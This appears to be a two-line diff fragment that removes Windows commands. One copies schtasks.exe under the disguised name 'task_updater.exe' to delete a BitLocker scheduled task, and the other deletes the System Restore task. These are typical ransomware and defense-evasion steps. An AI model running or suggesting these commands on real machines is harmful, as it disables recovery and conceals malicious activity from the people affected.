@@ -1,2 +1,0 @@
-copy schtasks.exe task_updater.exe && task_updater.exe /delete /tn "\Microsoft\Windows\BitLocker\BitLocker Encrypt All Drives" /f
-schtasks  /delete /f /tn "\Microsoft\Windows\SystemRestore\SR"
